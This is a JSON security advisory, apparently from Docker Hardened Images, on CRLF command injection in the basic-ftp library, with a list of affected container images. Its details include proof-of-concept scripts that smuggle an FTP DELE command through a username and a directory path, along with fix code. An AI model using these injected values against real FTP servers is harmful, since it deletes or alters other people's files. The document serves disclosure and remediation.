@@ -1,0 +1,194 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-2qbr-e3fs-t6tw-phtt",
+  "modified": "2026-10-23T20:45:10Z",
+  "published": "2026-10-23T20:45:10Z",
+  "upstream": [
+    "GHSA-6v7q-wjvx-w8wg"
+  ],
+  "summary": "## Summary",
+  "details": "## Summary\n\nbasic-ftp's CRLF injection protection (added in commit 2ecc8e2 for GHSA-chqc-8p9q-pq6q) is incomplete. Two code paths bypass the `protectWhitespace()` control character check: (1) the `login()` method directly concatenates user-supplied credentials into USER/PASS FTP commands without any validation, and (2) the `_openDir()` method sends an MKD command before `cd()` invokes `protectWhitespace()`, creating a TOCTOU bypass. Both vectors allow an attacker who controls input to inject arbitrary FTP commands into the control connection.\n\n## Details\n\n### Vector 1: Credential Injection (login)\n\nThe `login()` method constructs FTP commands by direct string concatenation with no CRLF validation:\n\n```typescript\n// src/Client.ts:216-231\nlogin(user = \"anonymous\", password = \"guest\"): Promise<FTPResponse> {\n    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)\n    return this.ftp.handle(\"USER \" + user, (res, task) => {  // Line 218: no validation on `user`\n        // ...\n        else if (res.code === 331) {\n            this.ftp.send(\"PASS \" + password)  // Line 226: no validation on `password`\n        }\n    })\n}\n```\n\n`FtpContext.send()` writes directly to the TCP socket:\n\n```typescript\n// src/FtpContext.ts:223-227\nsend(command: string) {\n    // ...\n    this._socket.write(command + \"\\r\\n\", this.encoding)\n}\n```\n\nThe `protectWhitespace()` method (line 762) rejects `\\r`, `\\n`, and `\\0` characters — but it is only called for path-based operations. Credentials never pass through it.\n\nThe public `access()` method (line 268) passes `options.user` and `options.password` directly to `login()` with no sanitization.\n\n### Vector 2: MKD TOCTOU Bypass (_openDir)\n\nThe `_openDir()` method sends an MKD command before the CRLF check in `cd()`:\n\n```typescript\n// src/Client.ts:745-748\nprotected async _openDir(dirName: string) {\n    await this.sendIgnoringError(\"MKD \" + dirName)  // Line 746: sent BEFORE validation\n    await this.cd(dirName)                           // Line 747: protectWhitespace() called here — too late\n}\n```\n\nThis is called from `ensureDir()` (line 729) which splits a user-supplied remote path by `/` and passes each fragment to `_openDir()`, and from `_uploadToWorkingDir()` (line 679) which passes local directory names read from the filesystem.\n\n## PoC\n\n### Vector 1: Credential Injection\n\n```javascript\nconst ftp = require(\"basic-ftp\");\n\nasync function exploit() {\n    const client = new ftp.Client();\n    client.ftp.verbose = true;\n\n    // Connect to target FTP server\n    await client.access({\n        host: \"target-ftp-server\",\n        port: 21,\n        // Username contains CRLF + injected DELE command\n        user: \"anonymous\\r\\nDELE important.txt\",\n        password: \"guest\"\n    });\n    // Server receives on the wire:\n    //   USER anonymous\\r\\n\n    //   DELE important.txt\\r\\n\n    //   PASS guest\\r\\n\n    // The DELE command executes before PASS is processed\n\n    client.close();\n}\n\nexploit();\n```\n\n### Vector 2: MKD TOCTOU Bypass\n\n```javascript\nconst ftp = require(\"basic-ftp\");\n\nasync function exploit() {\n    const client = new ftp.Client();\n    client.ftp.verbose = true;\n\n    await client.access({\n        host: \"target-ftp-server\",\n        user: \"anonymous\",\n        password: \"guest\"\n    });\n\n    // Path fragment with CRLF — MKD is sent before cd() validates\n    try {\n        await client.ensureDir(\"test\\r\\nDELE important.txt/subdir\");\n    } catch (e) {\n        // cd() throws after protectWhitespace() rejects, but MKD + DELE already sent\n    }\n    // Server received:\n    //   MKD test\\r\\n\n    //   DELE important.txt\\r\\n\n    //   CWD test\\r\\n  <-- this may fail, but damage is done\n\n    client.close();\n}\n\nexploit();\n```\n\n## Impact\n\nAn attacker who controls credentials or remote paths passed to basic-ftp can inject arbitrary FTP commands into the control connection. This enables:\n\n- **File deletion**: Inject `DELE` commands to remove files on the FTP server\n- **File manipulation**: Inject `RNFR`/`RNTO` to rename files, `MKD`/`RMD` to create/remove directories\n- **Server commands**: Inject `SITE` commands (e.g., `SITE CHMOD`) to change permissions\n- **Session hijacking**: Inject `USER`/`PASS` to re-authenticate as a different user\n\nThe credential injection vector (Vector 1) is particularly dangerous because it occurs before authentication, meaning the injected commands execute with whatever default permissions the server grants during the login handshake.\n\nApplications that accept user-supplied FTP credentials (e.g., web-based file managers, backup tools, deployment systems) are directly vulnerable.\n\n## Recommended Fix\n\nAdd CRLF validation to both code paths:\n\n**1. Validate credentials in `login()`:**\n\n```typescript\n// src/Client.ts:216\nlogin(user = \"anonymous\", password = \"guest\"): Promise<FTPResponse> {\n    if (/[\\r\\n\\0]/.test(user) || /[\\r\\n\\0]/.test(password)) {\n        return Promise.reject(new Error(\"Invalid credentials: Contains control characters\"));\n    }\n    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)\n    return this.ftp.handle(\"USER \" + user, (res, task) => {\n        // ... rest unchanged\n    })\n}\n```\n\n**2. Validate dirName in `_openDir()` before sending MKD:**\n\n```typescript\n// src/Client.ts:745\nprotected async _openDir(dirName: string) {\n    if (/[\\r\\n\\0]/.test(dirName)) {\n        throw new Error(\"Invalid path: Contains control characters\");\n    }\n    await this.sendIgnoringError(\"MKD \" + dirName)\n    await this.cd(dirName)\n}\n```\n\nAlternatively, centralize CRLF validation in `FtpContext.send()` so that all FTP commands are protected regardless of the calling code path.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "grist",
+        "purl": "pkg:docker/dhi/grist?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.6.1-debian12",
+        "1.7.0-debian12",
+        "1.7.1-debian12",
+        "1.7.2-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "grist",
+        "purl": "pkg:docker/dhi/grist?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.7.10-debian13",
+        "1.7.10-debian13-dev",
+        "1.7.11-debian13",
+        "1.7.11-debian13-dev",
+        "1.7.12-debian13",
+        "1.7.12-debian13-dev",
+        "1.7.2-debian13",
+        "1.7.3-debian13",
+        "1.7.4-debian13",
+        "1.7.5-debian13",
+        "1.7.7-debian13",
+        "1.7.8-debian13",
+        "1.7.8-debian13-dev",
+        "1.7.9-debian13",
+        "1.7.9-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "9.0.0-debian12",
+        "9.0.1-debian12",
+        "9.0.2-debian12",
+        "9.0.3-debian12",
+        "9.0.4-debian12",
+        "9.0.5-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "9.0.5-debian13",
+        "9.0.6-debian13",
+        "9.0.7-debian13",
+        "9.0.8-debian13",
+        "9.1.10-debian13",
+        "9.1.2-debian13",
+        "9.1.3-debian13",
+        "9.1.4-debian13",
+        "9.1.5-debian13",
+        "9.1.6-debian13",
+        "9.1.7-debian13",
+        "9.1.8-debian13",
+        "9.1.9-debian13",
+        "9.2.0-debian13",
+        "9.2.1-debian13",
+        "9.2.2-debian13",
+        "9.2.3-debian13",
+        "9.2.4-debian13",
+        "9.2.5-debian13",
+        "9.2.6-debian13",
+        "9.2.8-debian13",
+        "9.3.0-debian13",
+        "9.3.1-debian13",
+        "9.3.3-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "mongodb-mcp",
+        "purl": "pkg:docker/dhi/mongodb-mcp?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.3.1-debian13",
+        "1.4.0-debian13",
+        "1.4.1-debian13",
+        "1.5.0-debian13",
+        "1.6.0-debian13",
+        "1.7.0-debian13",
+        "1.8.0-debian13",
+        "1.8.1-debian13",
+        "1.9.0-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "opensearch-dashboards",
+        "purl": "pkg:docker/dhi/opensearch-dashboards?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.2.0-debian13",
+        "3.3.0-debian13",
+        "3.3.0-debian13-fips",
+        "3.4.0-debian13",
+        "3.4.0-debian13-fips",
+        "3.5.0-debian13",
+        "3.5.0-debian13-fips",
+        "3.6.0-debian13",
+        "3.6.0-debian13-fips"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "superset",
+        "purl": "pkg:docker/dhi/superset?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "6.0.0-debian13",
+        "6.0.0-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-2qbr-e3fs-t6tw-phtt"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-6v7q-wjvx-w8wg"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-6v7q-wjvx-w8wg"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/patrickjuchli/basic-ftp/commit/20327d35126e57e5fdbaae79a4b65222fbadc53c"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/patrickjuchli/basic-ftp/releases/tag/v5.2.2"
+    }
+  ]
+}
